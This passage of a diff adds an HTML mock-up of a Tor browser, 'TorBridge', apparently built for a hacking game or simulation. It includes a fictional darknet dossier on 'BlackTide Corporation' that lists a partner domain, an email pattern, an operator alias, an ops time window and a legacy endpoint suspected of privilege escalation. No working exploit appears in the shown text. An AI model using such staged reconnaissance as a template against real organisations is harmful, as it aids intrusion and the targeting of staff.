@@ -1,0 +1,1746 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>TorBridge</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg0:    #1c1b22;
+      --bg1:    #2b2a33;
+      --bg2:    #38373f;
+      --bg3:    #42404e;
+      --accent: #9069d8;
+      --acc2:   #7c4dff;
+      --text:   #fbfbfe;
+      --text2:  #cfcfd8;
+      --text3:  #9e9eac;
+      --border: rgba(255,255,255,.08);
+      --green:  #3fe1b0;
+      --red:    #ff6a75;
+      --yellow: #ffd567;
+      --orange: #ff9a44;
+      --tab-h:  32px;
+      --nav-h:  44px;
+    }
+    html, body { height:100%; overflow:hidden; background:var(--bg0); color:var(--text);
+                 font-family:-apple-system,"Segoe UI",system-ui,sans-serif; font-size:13px; }
+
+    /* ── BROWSER SHELL ─────────────────────────────────────────── */
+    .browser { height:100%; display:flex; flex-direction:column; }
+
+    /* Traffic lights */
+    .tl-bar { height:22px; flex-shrink:0; background:var(--bg1);
+               display:flex; align-items:center; padding:0 10px; gap:7px;
+               -webkit-app-region:drag; user-select:none; }
+    .tl { width:12px; height:12px; border-radius:50%; flex-shrink:0; cursor:pointer; }
+    .tl-r { background:#ff5f57; } .tl-r:hover { background:#ff3b30; }
+    .tl-y { background:#febc2e; } .tl-y:hover { background:#ffb300; }
+    .tl-g { background:#28c840; } .tl-g:hover { background:#1ea832; }
+    .tl-title { flex:1; text-align:center; font-size:11px; color:var(--text3); letter-spacing:.04em; }
+
+    /* Tabs */
+    .tabs-bar { height:var(--tab-h); flex-shrink:0; background:var(--bg1);
+                display:flex; align-items:flex-end; padding:0 6px; gap:2px;
+                border-bottom:1px solid var(--bg0); overflow-x:auto; scrollbar-width:none; }
+    .tabs-bar::-webkit-scrollbar { display:none; }
+    .tab { display:flex; align-items:center; gap:5px; height:28px; padding:0 10px 0 11px;
+           border-radius:6px 6px 0 0; background:var(--bg2); color:var(--text3);
+           font-size:11.5px; white-space:nowrap; cursor:pointer; min-width:90px; max-width:180px;
+           flex-shrink:0; border:1px solid transparent; border-bottom:none;
+           position:relative; top:1px; transition:background .1s; }
+    .tab:hover { background:var(--bg3); }
+    .tab.active { background:var(--bg0); color:var(--text); border-color:var(--border); }
+    .tab .tab-fav  { font-size:11px; flex-shrink:0; }
+    .tab .tab-lbl  { flex:1; overflow:hidden; text-overflow:ellipsis; }
+    .tab .tab-x    { width:15px; height:15px; border-radius:50%; display:flex;
+                     align-items:center; justify-content:center; font-size:11px;
+                     color:transparent; flex-shrink:0; }
+    .tab:hover .tab-x { color:var(--text3); background:var(--bg3); }
+    .tab.active .tab-x { color:var(--text3); opacity:.6; }
+    .tab.loading .tab-fav { animation:spin .7s linear infinite; }
+    @keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+    .tab-new { width:28px; height:28px; border-radius:50%; border:none; background:transparent;
+               color:var(--text3); font-size:18px; cursor:pointer; display:flex;
+               align-items:center; justify-content:center; flex-shrink:0; align-self:center; }
+    .tab-new:hover { background:var(--bg3); color:var(--text); }
+
+    /* Navbar */
+    .navbar { height:var(--nav-h); flex-shrink:0; background:var(--bg0);
+              border-bottom:1px solid var(--border); display:flex;
+              align-items:center; gap:5px; padding:0 10px; position:relative; }
+    /* progress bar */
+    .nav-progress { position:absolute; bottom:0; left:0; height:2px;
+                    background:var(--accent); width:0%; transition:width .25s ease;
+                    border-radius:0 2px 0 0; z-index:10; }
+    .nav-progress.done { opacity:0; transition:opacity .4s .1s; }
+    .nav-btn { width:30px; height:30px; border-radius:6px; border:none; background:transparent;
+               color:var(--text3); font-size:17px; cursor:pointer; display:flex;
+               align-items:center; justify-content:center; flex-shrink:0; transition:background .1s, color .1s; }
+    .nav-btn:hover:not(:disabled) { background:var(--bg2); color:var(--text); }
+    .nav-btn:disabled { opacity:.3; cursor:default; }
+    /* URL bar */
+    .urlbar { flex:1; height:32px; background:var(--bg1); border:1px solid var(--border);
+              border-radius:8px; display:flex; align-items:center; padding:0 10px; gap:6px;
+              transition:border-color .15s, box-shadow .15s; }
+    .urlbar:focus-within { border-color:var(--accent); box-shadow:0 0 0 2px rgba(144,105,216,.22); }
+    .url-lock { font-size:12px; color:var(--green); flex-shrink:0; }
+    .url-lock.warn { color:var(--orange); }
+    .url-badge { font-size:10px; background:rgba(144,105,216,.18); color:#b39dfc;
+                 border-radius:4px; padding:2px 7px; letter-spacing:.04em;
+                 flex-shrink:0; font-weight:600; }
+    #urlInput { flex:1; border:none; outline:none; background:transparent;
+                color:var(--text); font-size:12px;
+                font-family:ui-monospace,"Courier New",monospace; min-width:0; }
+    #urlInput::placeholder { color:var(--text3); font-family:inherit; }
+    #urlInput::selection { background:var(--accent); color:#fff; }
+    .nav-menu-btn { width:30px; height:30px; border-radius:6px; border:none; background:transparent;
+                    color:var(--text3); font-size:17px; cursor:pointer; display:flex;
+                    align-items:center; justify-content:center; flex-shrink:0; }
+    .nav-menu-btn:hover { background:var(--bg2); color:var(--text); }
+
+    /* Bookmarks bar */
+    .bk-bar { height:28px; flex-shrink:0; background:var(--bg0); border-bottom:1px solid var(--border);
+              display:none; align-items:center; padding:0 8px; gap:2px; overflow-x:auto; scrollbar-width:none; }
+    .bk-bar.visible { display:flex; }
+    .bk-item { display:flex; align-items:center; gap:5px; padding:3px 9px;
+               border-radius:5px; cursor:pointer; white-space:nowrap; font-size:11.5px;
+               color:var(--text3); transition:background .1s; }
+    .bk-item:hover { background:var(--bg2); color:var(--text); }
+    .bk-item .bk-fav { font-size:11px; }
+
+    /* ── VIEWPORT ────────────────────────────────────────────── */
+    .viewport { flex:1; overflow:hidden; position:relative; background:#0f0f13; }
+    .page { position:absolute; inset:0; overflow-y:auto; display:none;
+            scrollbar-width:thin; scrollbar-color:var(--bg3) transparent; }
+    .page.active { display:block; }
+    .page::-webkit-scrollbar { width:6px; }
+    .page::-webkit-scrollbar-thumb { background:var(--bg3); border-radius:3px; }
+
+    /* Loading overlay */
+    .page-loading { background:#0f0f13; display:flex; align-items:center;
+                    justify-content:center; }
+    .circ-wrap { width:380px; text-align:left; }
+    .circ-title { font-size:13px; color:var(--accent); letter-spacing:.08em;
+                  text-transform:uppercase; margin-bottom:20px; }
+    .circ-nodes { display:flex; flex-direction:column; gap:10px; margin-bottom:22px; }
+    .circ-node { display:flex; align-items:center; gap:12px; opacity:0;
+                 transition:opacity .3s; }
+    .circ-node.show { opacity:1; }
+    .circ-dot { width:10px; height:10px; border-radius:50%; background:var(--bg3);
+                flex-shrink:0; transition:background .3s; }
+    .circ-dot.active { background:var(--green); box-shadow:0 0 6px rgba(63,225,176,.5); }
+    .circ-dot.pending { background:var(--yellow); animation:blink .6s ease-in-out infinite; }
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.3} }
+    .circ-info { font-family:ui-monospace,monospace; font-size:11px; }
+    .circ-info .ci-ip   { color:var(--text2); }
+    .circ-info .ci-cc   { color:var(--text3); }
+    .circ-info .ci-ok   { color:var(--green); }
+    .circ-info .ci-pend { color:var(--yellow); }
+    .circ-status { font-size:11px; color:var(--text3); font-family:ui-monospace,monospace; }
+    .circ-status span { color:var(--accent); }
+    /* progress track */
+    .circ-bar { height:2px; background:var(--bg2); border-radius:1px; margin-top:18px; }
+    .circ-bar-fill { height:100%; background:var(--accent); border-radius:1px;
+                     width:0%; transition:width .25s; }
+
+    /* ── STATUSBAR ───────────────────────────────────────────── */
+    .statusbar { height:20px; flex-shrink:0; background:var(--bg1);
+                 border-top:1px solid var(--border); display:flex; align-items:center;
+                 padding:0 12px; gap:20px; font-size:10px; color:var(--text3);
+                 user-select:none; }
+    .status-tor  { color:#b39dfc; }
+    .status-ssl  { color:var(--green); }
+    .status-url  { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .status-dl   { color:var(--yellow); cursor:pointer; }
+    .status-dl:hover { text-decoration:underline; }
+
+    /* ── CONTEXT MENU ────────────────────────────────────────── */
+    .ctx-menu { position:fixed; background:var(--bg1); border:1px solid var(--border);
+                border-radius:8px; padding:4px 0; min-width:180px; z-index:1000;
+                box-shadow:0 8px 24px rgba(0,0,0,.5); display:none; }
+    .ctx-menu.show { display:block; }
+    .ctx-item { padding:7px 16px; font-size:12px; color:var(--text2); cursor:pointer;
+                display:flex; align-items:center; gap:10px; }
+    .ctx-item:hover { background:var(--bg2); color:var(--text); }
+    .ctx-sep  { height:1px; background:var(--border); margin:3px 0; }
+    .ctx-item.disabled { opacity:.4; cursor:default; pointer-events:none; }
+
+    /* ── DOWNLOAD BAR ─────────────────────────────────────────── */
+    .dl-bar { flex-shrink:0; background:var(--bg1); border-top:1px solid var(--border);
+              display:none; align-items:center; padding:5px 12px; gap:10px; font-size:11px; }
+    .dl-bar.show { display:flex; }
+    .dl-item { display:flex; align-items:center; gap:7px; background:var(--bg2);
+               border-radius:6px; padding:5px 10px; }
+    .dl-icon  { color:var(--green); }
+    .dl-name  { color:var(--text2); }
+    .dl-size  { color:var(--text3); }
+    .dl-close { margin-left:8px; cursor:pointer; color:var(--text3); }
+    .dl-close:hover { color:var(--text); }
+
+    /* ═══ PAGE: NEW TAB ══════════════════════════════════════════ */
+    .nt-wrap { min-height:100%; display:flex; flex-direction:column; align-items:center;
+               justify-content:center; padding:40px 20px;
+               background:radial-gradient(ellipse 80% 60% at 50% 20%, rgba(124,77,255,.1) 0%, transparent 70%), #0f0f13; }
+    .nt-logo { display:flex; flex-direction:column; align-items:center; gap:8px; margin-bottom:32px; }
+    .nt-onion { filter:drop-shadow(0 0 18px rgba(144,105,216,.55)); }
+    .nt-name  { font-size:20px; font-weight:700; letter-spacing:.08em; color:#b39dfc; }
+    .nt-sub   { font-size:10px; color:var(--text3); letter-spacing:.14em; text-transform:uppercase; }
+    .nt-search { width:100%; max-width:520px; display:flex; align-items:center;
+                 background:var(--bg1); border:1px solid var(--border); border-radius:24px;
+                 padding:6px 6px 6px 18px; transition:border-color .15s, box-shadow .15s; margin-bottom:28px; }
+    .nt-search:focus-within { border-color:var(--accent); box-shadow:0 0 0 3px rgba(144,105,216,.2); }
+    .nt-search input { flex:1; background:transparent; border:none; outline:none; color:var(--text);
+                       font-size:14px; min-width:0; }
+    .nt-search input::placeholder { color:var(--text3); }
+    .nt-search button { background:var(--acc2); border:none; color:#fff; border-radius:18px;
+                        padding:8px 20px; font-size:12px; font-weight:600; cursor:pointer; }
+    .nt-search button:hover { background:var(--accent); }
+    .nt-sites { display:grid; grid-template-columns:repeat(3, 140px); gap:10px; }
+    @media (max-width:500px) { .nt-sites { grid-template-columns:repeat(2,140px); } }
+    .nt-site { background:var(--bg1); border:1px solid var(--border); border-radius:10px;
+               padding:14px 12px; text-align:center; cursor:pointer;
+               transition:background .12s, border-color .12s, transform .12s; }
+    .nt-site:hover { background:var(--bg2); border-color:rgba(144,105,216,.4); transform:translateY(-2px); }
+    .nt-site-icon { margin-bottom:7px; display:flex; align-items:center;
+                    justify-content:center; color:var(--accent); }
+    .nt-site-name { font-size:11px; color:var(--text2); font-weight:500; }
+    .nt-site-url  { font-size:9px; color:var(--text3); margin-top:2px; font-family:ui-monospace,monospace;
+                    overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+
+    /* ═══ PAGE: SEARCH RESULTS ═══════════════════════════════════ */
+    .sr-wrap  { padding:28px 32px; max-width:760px; }
+    .sr-meta  { font-size:12px; color:var(--text3); margin-bottom:20px;
+                padding-bottom:10px; border-bottom:1px solid var(--border); }
+    .sr-item  { margin-bottom:24px; }
+    .sr-url   { font-size:11px; color:#b39dfc; font-family:ui-monospace,monospace; margin-bottom:2px; }
+    .sr-title { font-size:15px; color:#a78bfa; cursor:pointer; transition:color .1s; }
+    .sr-title:hover { color:#c4b5fd; text-decoration:underline; }
+    .sr-desc  { font-size:12px; color:var(--text3); line-height:1.55; margin-top:3px; }
+    .sr-warn  { font-size:10px; color:var(--red); margin-top:3px; }
+
+    /* ═══ PAGE: DOCUMENT GÉNÉRIQUE ═══════════════════════════════ */
+    .doc-wrap { max-width:820px; margin:0 auto; padding:28px 32px 40px; }
+    .doc-header { border-bottom:1px solid var(--border); padding-bottom:16px;
+                  margin-bottom:24px; display:flex; align-items:flex-start; gap:14px; }
+    .doc-logo-icon { font-size:32px; line-height:1; }
+    .doc-logo-text .doc-title { font-size:18px; font-weight:700; letter-spacing:.04em; }
+    .doc-logo-text .doc-sub   { font-size:11px; color:var(--text3); margin-top:3px; }
+    .doc-badge-row { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:18px; }
+    .badge { font-size:10px; border-radius:4px; padding:3px 9px; font-weight:600; letter-spacing:.04em; }
+    .badge-warn { background:rgba(255,106,117,.12); color:var(--red);    border:1px solid rgba(255,106,117,.3); }
+    .badge-info { background:rgba(144,105,216,.12); color:#b39dfc;       border:1px solid rgba(144,105,216,.3); }
+    .badge-ok   { background:rgba(63,225,176,.1);   color:var(--green);  border:1px solid rgba(63,225,176,.3); }
+    .badge-gold { background:rgba(255,213,103,.1);  color:var(--yellow); border:1px solid rgba(255,213,103,.3); }
+    .badge-red  { background:rgba(255,106,117,.12); color:var(--red);    border:1px solid rgba(255,106,117,.3); }
+    .doc-section { margin-bottom:28px; }
+    .doc-section-title { font-size:10px; text-transform:uppercase; letter-spacing:.1em;
+                         color:#b39dfc; margin-bottom:10px; padding-bottom:4px;
+                         border-bottom:1px solid rgba(144,105,216,.2); }
+    .card { background:var(--bg1); border:1px solid var(--border); border-radius:8px;
+            padding:14px 16px; margin-bottom:10px; }
+    .card-meta { display:flex; gap:12px; font-size:10px; color:var(--text3); margin-bottom:8px; }
+    .card-meta .card-author { color:#b39dfc; font-weight:600; }
+    .card p   { font-size:12px; color:var(--text2); line-height:1.6; margin-bottom:4px; }
+    .card code { color:#b39dfc; font-family:ui-monospace,monospace; background:rgba(144,105,216,.1);
+                 border-radius:3px; padding:0 4px; }
+    .card .tags { margin-top:8px; }
+    .tag { display:inline-block; font-size:10px; background:rgba(144,105,216,.12); color:#9e8ce0;
+           border-radius:4px; padding:2px 7px; margin-right:4px; }
+    .data-table { width:100%; border-collapse:collapse; font-size:11.5px; }
+    .data-table th { text-align:left; background:var(--bg1); color:var(--text3); padding:8px 12px;
+                     font-weight:600; letter-spacing:.04em; border-bottom:1px solid var(--border); }
+    .data-table td { padding:8px 12px; border-bottom:1px solid rgba(255,255,255,.04);
+                     color:var(--text2); font-family:ui-monospace,monospace; }
+    .data-table tr:hover td { background:rgba(255,255,255,.02); }
+    .hl-gold   { color:var(--yellow); }
+    .hl-red    { color:var(--red); }
+    .hl-green  { color:var(--green); }
+    .hl-purple { color:#b39dfc; }
+    .hl-orange { color:var(--orange); }
+    .callout { border-radius:8px; padding:12px 16px; margin-bottom:16px; font-size:12px;
+               line-height:1.6; display:flex; gap:10px; align-items:flex-start; }
+    .callout-icon { font-size:15px; flex-shrink:0; margin-top:1px; }
+    .callout-warn { background:rgba(255,106,117,.07); border:1px solid rgba(255,106,117,.25); color:#ffb3b8; }
+    .callout-info { background:rgba(144,105,216,.07); border:1px solid rgba(144,105,216,.25); color:#c4b5fd; }
+    .codeblock { background:#0a0a10; border:1px solid var(--border); border-radius:8px;
+                 padding:14px 16px; font-family:ui-monospace,"Courier New",monospace;
+                 font-size:11.5px; line-height:1.7; color:#a3e4d7; margin:10px 0; overflow-x:auto; }
+    .codeblock .c-dim    { color:#555; }
+    .codeblock .c-purple { color:#b39dfc; }
+    .codeblock .c-green  { color:var(--green); }
+    .codeblock .c-yellow { color:var(--yellow); }
+
+    /* ═══ PAGE: VULNSEARCH ════════════════════════════════════════ */
+    .vs-wrap { max-width:1000px; margin:0 auto; padding:28px 32px 40px; }
+    .vs-header { display:flex; align-items:center; gap:14px; margin-bottom:20px; }
+    .vs-logo-txt { font-size:22px; font-weight:800; letter-spacing:.04em; color:#3fe1b0; }
+    .vs-logo-sub { font-size:11px; color:var(--text3); margin-top:2px; }
+    .vs-search-row { display:flex; gap:8px; margin-bottom:16px; }
+    .vs-search-input { flex:1; height:36px; background:var(--bg1); border:1px solid var(--border);
+                       border-radius:8px; padding:0 14px; color:var(--text); font-size:12.5px;
+                       font-family:ui-monospace,monospace; outline:none;
+                       transition:border-color .15s, box-shadow .15s; }
+    .vs-search-input:focus { border-color:var(--green); box-shadow:0 0 0 2px rgba(63,225,176,.2); }
+    .vs-filter-row { display:flex; gap:6px; flex-wrap:wrap; margin-bottom:18px; }
+    .vs-pill { font-size:10.5px; padding:4px 12px; border-radius:20px; cursor:pointer;
+               border:1px solid var(--border); background:var(--bg1); color:var(--text3);
+               transition:all .1s; }
+    .vs-pill.active { background:rgba(63,225,176,.1); border-color:var(--green); color:var(--green); }
+    .vs-pill:hover { background:var(--bg2); color:var(--text); }
+    .vs-count { font-size:11px; color:var(--text3); margin-bottom:10px; }
+    .vs-table { width:100%; border-collapse:collapse; font-size:11.5px; }
+    .vs-table th { text-align:left; background:var(--bg2); color:var(--text3); padding:9px 12px;
+                   font-weight:600; letter-spacing:.04em; border-bottom:1px solid var(--border);
+                   position:sticky; top:0; cursor:pointer; }
+    .vs-table th:hover { color:var(--text); }
+    .vs-table td { padding:8px 12px; border-bottom:1px solid rgba(255,255,255,.04);
+                   color:var(--text2); font-family:ui-monospace,monospace; vertical-align:middle; }
+    .vs-table tr:hover td { background:rgba(255,255,255,.025); }
+    .vs-table tr.highlight td { background:rgba(63,225,176,.06) !important; }
+    .vs-id   { color:#b39dfc; font-size:10.5px; }
+    .vs-cve  { font-size:10.5px; }
+    .vs-desc { font-family:-apple-system,"Segoe UI",system-ui,sans-serif; font-size:11.5px; color:var(--text); }
+    .vs-type-pill { display:inline-block; padding:2px 7px; border-radius:4px; font-size:10px;
+                    font-weight:600; white-space:nowrap; }
+    .tp-remote  { background:rgba(255,106,117,.12); color:var(--red); }
+    .tp-local   { background:rgba(255,154,68,.12);  color:var(--orange); }
+    .tp-webapp  { background:rgba(144,105,216,.12); color:#b39dfc; }
+    .tp-dos     { background:rgba(255,213,103,.1);  color:var(--yellow); }
+    .vs-dl-btn  { background:rgba(63,225,176,.1); border:1px solid rgba(63,225,176,.3); color:var(--green);
+                  border-radius:5px; padding:3px 9px; font-size:10px; cursor:pointer; font-family:inherit; }
+    .vs-dl-btn:hover { background:rgba(63,225,176,.2); }
+    .vs-verified { color:var(--green); font-size:10px; }
+    .vs-unverif  { color:var(--text3); font-size:10px; }
+
+    /* ═══ PAGE: MARKET ═══════════════════════════════════════════ */
+    .mk-wrap { max-width:900px; margin:0 auto; padding:28px 32px 40px; }
+    .mk-cats { display:flex; gap:6px; margin-bottom:20px; flex-wrap:wrap; }
+    .mk-cat  { padding:5px 14px; border-radius:20px; border:1px solid var(--border);
+               background:var(--bg1); color:var(--text3); font-size:11px; cursor:pointer; }
+    .mk-cat.active { background:rgba(144,105,216,.15); border-color:var(--accent); color:#b39dfc; }
+    .mk-grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(230px, 1fr)); gap:12px; }
+    .mk-card { background:var(--bg1); border:1px solid var(--border); border-radius:10px;
+               padding:14px 14px 12px; cursor:pointer; transition:border-color .12s, transform .12s; }
+    .mk-card:hover { border-color:rgba(144,105,216,.4); transform:translateY(-1px); }
+    .mk-card-title { font-size:12.5px; color:var(--text); font-weight:500; margin-bottom:4px; }
+    .mk-card-desc  { font-size:11px; color:var(--text3); line-height:1.45; margin-bottom:8px; }
+    .mk-card-foot  { display:flex; align-items:center; justify-content:space-between; }
+    .mk-price  { font-size:12px; color:var(--yellow); font-weight:600; font-family:ui-monospace,monospace; }
+    .mk-vendor { font-size:10px; color:#b39dfc; }
+    .mk-tags   { display:flex; gap:4px; flex-wrap:wrap; margin-bottom:6px; }
+    .mk-tag { font-size:9.5px; background:rgba(144,105,216,.1); color:var(--text3);
+              border-radius:3px; padding:1px 6px; }
+    .mk-rating { font-size:10px; color:var(--yellow); }
+
+    /* ═══ PAGE: PASTE ════════════════════════════════════════════ */
+    .ps-wrap  { max-width:860px; margin:0 auto; padding:28px 32px 40px; }
+    .ps-list  { display:flex; flex-direction:column; gap:8px; }
+    .ps-item  { background:var(--bg1); border:1px solid var(--border); border-radius:8px;
+                padding:12px 16px; cursor:pointer; transition:border-color .12s; }
+    .ps-item:hover { border-color:rgba(144,105,216,.35); }
+    .ps-item-head { display:flex; align-items:center; gap:10px; margin-bottom:6px; }
+    .ps-item-title { font-size:12.5px; color:#b39dfc; font-weight:500; }
+    .ps-item-meta  { font-size:10px; color:var(--text3); margin-left:auto; }
+    .ps-item-pre   { font-family:ui-monospace,monospace; font-size:10.5px; color:var(--text3);
+                     overflow:hidden; max-height:40px; line-height:1.5; }
+    .ps-item-tags  { display:flex; gap:4px; margin-top:6px; }
+
+    /* ═══ PAGE: ERREUR ═══════════════════════════════════════════ */
+    .err-wrap  { min-height:100%; display:flex; align-items:center;
+                 justify-content:center; padding:40px; text-align:center; }
+    .err-box   { max-width:460px; }
+    .err-icon  { margin-bottom:16px; }
+    .err-title { font-size:18px; font-weight:700; color:var(--red); margin-bottom:10px; }
+    .err-url   { font-family:ui-monospace,monospace; font-size:12px; color:var(--text3);
+                 margin-bottom:12px; background:var(--bg1); border-radius:6px; padding:6px 12px; }
+    .err-desc  { font-size:12px; color:var(--text3); line-height:1.6; margin-bottom:18px; }
+    .err-btns  { display:flex; gap:8px; justify-content:center; }
+    .err-btn   { padding:8px 18px; border-radius:7px; border:1px solid var(--border);
+                 background:var(--bg1); color:var(--text2); font-size:12px; cursor:pointer; }
+    .err-btn:hover { background:var(--bg2); color:var(--text); }
+    .err-btn.primary { background:rgba(144,105,216,.18); border-color:var(--accent); color:#b39dfc; }
+
+    /* PAGE: CLEARNET BLOCKED */
+    .clr-wrap  { min-height:100%; display:flex; align-items:center;
+                 justify-content:center; padding:40px; text-align:center; }
+    .clr-box   { max-width:460px; }
+    .clr-icon  { margin-bottom:14px; color:var(--orange); }
+    .clr-title { font-size:17px; font-weight:700; color:var(--orange); margin-bottom:10px; }
+    .clr-url   { font-family:ui-monospace,monospace; font-size:12px; color:var(--text3);
+                 background:var(--bg1); border-radius:6px; padding:6px 12px; margin-bottom:12px; }
+    .clr-desc  { font-size:12px; color:var(--text3); line-height:1.6; }
+
+    /* PAGE: DYNAMIC */
+    .dyn-wrap { max-width:860px; margin:0 auto; padding:28px 32px 40px; }
+  </style>
+</head>
+<body>
+<div class="browser">
+
+  <!-- Traffic lights -->
+  <div class="tl-bar">
+    <div class="tl tl-r"></div>
+    <div class="tl tl-y"></div>
+    <div class="tl tl-g"></div>
+    <span class="tl-title">TorBridge — Secure Onion Router</span>
+  </div>
+
+  <!-- Onglets -->
+  <div class="tabs-bar" id="tabsBar">
+    <button class="tab-new" id="btnNewTab" title="Nouvel onglet (Ctrl+T)">+</button>
+  </div>
+
+  <!-- Navbar -->
+  <div class="navbar">
+    <div class="nav-progress" id="navProgress"></div>
+    <button class="nav-btn" id="btnBack"    title="Précédent (Alt+←)" disabled>&#8249;</button>
+    <button class="nav-btn" id="btnForward" title="Suivant (Alt+→)"   disabled>&#8250;</button>
+    <button class="nav-btn" id="btnReload"  title="Actualiser (F5)">&#8635;</button>
+    <div class="urlbar">
+      <span class="url-lock" id="urlLock">&#128274;</span>
+      <span class="url-badge" id="urlBadge">TOR</span>
+      <input id="urlInput" type="text" spellcheck="false" autocomplete="off"
+             placeholder="Rechercher ou saisir une adresse .onion…" />
+    </div>
+    <button class="nav-menu-btn" id="btnMenu" title="Menu (Ctrl+B : bookmarks)">&#8801;</button>
+  </div>
+
+  <!-- Bookmarks bar (Ctrl+B) -->
+  <div class="bk-bar" id="bkBar">
+    <!-- injecté JS -->
+  </div>
+
+  <!-- Viewport -->
+  <div class="viewport">
+
+    <!-- ─── LOADING ─── -->
+    <div class="page page-loading" id="pg-loading">
+      <div class="circ-wrap">
+        <div class="circ-title">Établissement du circuit Tor</div>
+        <div class="circ-nodes" id="circNodes">
+          <div class="circ-node" id="cn0">
+            <div class="circ-dot" id="cd0"></div>
+            <div class="circ-info">
+              <span class="ci-ip" id="ci0">—</span>
+              <span class="ci-cc" id="cc0"></span>
+              <span id="cs0"></span>
+            </div>
+          </div>
+          <div class="circ-node" id="cn1">
+            <div class="circ-dot" id="cd1"></div>
+            <div class="circ-info">
+              <span class="ci-ip" id="ci1">—</span>
+              <span class="ci-cc" id="cc1"></span>
+              <span id="cs1"></span>
+            </div>
+          </div>
+          <div class="circ-node" id="cn2">
+            <div class="circ-dot" id="cd2"></div>
+            <div class="circ-info">
+              <span class="ci-ip" id="ci2">—</span>
+              <span class="ci-cc" id="cc2"></span>
+              <span id="cs2"></span>
+            </div>
+          </div>
+        </div>
+        <div class="circ-status" id="circStatus">En attente du réseau Tor…</div>
+        <div class="circ-bar"><div class="circ-bar-fill" id="circBarFill"></div></div>
+      </div>
+    </div>
+
+    <!-- ─── NEWTAB ─── -->
+    <div class="page" id="pg-newtab">
+      <div class="nt-wrap">
+        <div class="nt-logo">
+          <svg class="nt-onion" viewBox="0 0 64 64" fill="none" width="60" height="60">
+            <circle cx="32" cy="32" r="28" stroke="#9069d8" stroke-width="2.5" fill="none"/>
+            <circle cx="32" cy="32" r="19" stroke="#9069d8" stroke-width="2" fill="none" stroke-dasharray="4 3"/>
+            <circle cx="32" cy="32" r="10" stroke="#9069d8" stroke-width="1.5" fill="rgba(144,105,216,.15)"/>
+            <circle cx="32" cy="32" r="3" fill="#9069d8"/>
+          </svg>
+          <span class="nt-name">TorBridge</span>
+          <span class="nt-sub">Anonymized · Encrypted · Onion Routing</span>
+        </div>
+        <div class="nt-search">
+          <input id="homeQ" type="text" placeholder="Rechercher sur HiddenSearch…" spellcheck="false" />
+          <button id="homeSearchBtn">Rechercher</button>
+        </div>
+        <div class="nt-sites" id="ntSites"></div>
+      </div>
+    </div>
+
+    <!-- ─── RÉSULTATS ─── -->
+    <div class="page" id="pg-search">
+      <div class="sr-wrap">
+        <div class="sr-meta" id="srMeta">HiddenSearch</div>
+        <div id="srList"></div>
+      </div>
+    </div>
+
+    <!-- ─── BLACKTIDE CORP ─── -->
+    <div class="page" id="pg-bt-corp">
+      <div class="doc-wrap">
+        <div class="doc-header">
+          <span class="doc-logo-icon"><svg viewBox="0 0 24 24" fill="none" stroke="#ff6a75" stroke-width="1.6" width="32" height="32"><rect x="3" y="9" width="18" height="12" rx="1"/><path d="M8 9V6a4 4 0 0 1 8 0v3"/><line x1="12" y1="13" x2="12" y2="17"/></svg></span>
+          <div class="doc-logo-text">
+            <div class="doc-title" style="color:#ff6a75">BLACKTIDE CORPORATION</div>
+            <div class="doc-sub">miroir anonyme non officiel · Onion indexé 2026-04</div>
+          </div>
+        </div>
+        <div class="doc-badge-row">
+          <span class="badge badge-warn">! Miroir non officiel</span>
+          <span class="badge badge-info">nginx 1.27 + php-fpm</span>
+          <span class="badge badge-gold">clearance 2 requis</span>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Présentation</div>
+          <div class="card">
+            <p>BlackTide Corporation est un fournisseur d'infrastructure sécurisée B2B. Son portail partenaire <code>partner.blacktide-corp.tld</code> gère l'authentification via un gateway <strong>nginx/php-fpm</strong>.</p>
+            <p>Depuis <strong>Q1 2026</strong>, des vulnérabilités circulent sur le module legacy de l'<code>/internal/auth-gateway/v2/</code> — notamment le endpoint <code>ops-relay.php</code> permettant une escalade de clearance.</p>
+          </div>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Données techniques exposées</div>
+          <table class="data-table">
+            <thead><tr><th>Élément</th><th>Valeur</th><th>Source</th></tr></thead>
+            <tbody>
+              <tr><td>Stack web</td><td class="hl-gold">nginx/1.27 + php-fpm</td><td>scan passif 2026-04</td></tr>
+              <tr><td>Domaine partenaire</td><td class="hl-gold">partner.blacktide-corp.tld</td><td>WHOIS leak</td></tr>
+              <tr><td>Email pattern</td><td class="hl-gold">prenom.nom@blacktide-corp.tld</td><td>forum #7782</td></tr>
+              <tr><td>Auth gateway</td><td class="hl-gold">/internal/auth-gateway/v2/</td><td>crawl 2026-03</td></tr>
+              <tr><td>Opérateur clé</td><td class="hl-gold">n.morel</td><td>forum #7782 · runbook leak</td></tr>
+              <tr><td>Fenêtre ops</td><td class="hl-gold">02:00–03:00 UTC</td><td>runbook BT-OPS-2194</td></tr>
+              <tr><td>Incident ref.</td><td class="hl-gold">BT-AUTH-4421</td><td>registre incidents 2026-04</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <div class="doc-section">
+          <div class="doc-section-title">Activité récente (sources tierces)</div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">omega_watcher</span><span>2026-04-23</span><span>forum #7782</span></div>
+            <p>Alias <strong>n.morel</strong> vu sur le relay ops entre <code>02h–03h UTC</code>. Correspond au pattern du runbook BT-OPS-2194. Fenêtre d'action confirmée.</p>
+            <div class="tags"><span class="tag">ops</span><span class="tag">relay</span><span class="tag">clearance</span></div>
+          </div>
+          <div class="card">
+            <div class="card-meta"><span class="card-author">ghost_indexer</span><span>2026-03-18</span><span>scan auto</span></div>
+            <p>Le module <code>/internal/auth-gateway/v2/ops-relay.php</code> répond avec header <code>X-Relay-Mode: legacy-mirror</code>. Suspicion d'escalade via paramètre <code>action=upgrade</code>.</p>
+            <div class="tags"><span class="tag">auth-gateway</span><span class="tag">legacy</span><span class="tag">escalation</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ─── BLACKTIDE LEAK ─── -->
+    <div class="page" id="pg-bt-leak">
+      <div class="doc-wrap">
+        <div class="doc-header">
